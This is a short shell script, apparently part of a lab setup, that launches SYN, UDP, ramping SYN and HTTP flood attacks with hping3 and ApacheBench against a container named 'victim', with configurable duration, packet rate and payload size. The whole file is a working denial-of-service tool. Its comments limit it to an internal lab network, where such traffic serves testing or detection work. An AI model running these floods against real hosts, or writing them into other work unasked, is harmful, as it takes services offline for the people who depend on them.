#!/bin/sh
# Usage: attack <syn|udp|ramp|http> <seconds> [packets_per_second] [payload_bytes]
# Targets the `victim` container only, on the internal lab network.
#   ramp: SYN flood whose rate doubles every 2 s, from 25 pps up to packets_per_second.
set -eu
kind=$1 secs=$2 pps=${3:-2000} size=${4:-0}

flood() {  # flood <seconds> <pps> <hping3 mode args...>
  t=$1 rate=$2; shift 2
  timeout "$t" hping3 --quiet "$@" -d "$size" -i "u$((1000000 / rate))" victim || [ $? -eq 124 ]
}

case "$kind" in
  syn) flood "$secs" "$pps" -S -p 80 ;;
  udp) flood "$secs" "$pps" --udp -p ++1024 ;;
  ramp)
    rate=25 end=$(($(date +%s) + secs))
    while [ "$(date +%s)" -lt "$end" ]; do
      flood 2 "$rate" -S -p 80
      [ "$rate" -lt "$pps" ] && rate=$((rate * 2))
    done ;;
  http) ab -q -t "$secs" -c 50 -n 100000000 http://victim/ >/dev/null ;;
  *) echo "usage: attack <syn|udp|ramp|http> <seconds> [pps] [bytes]" >&2; exit 2 ;;
esac
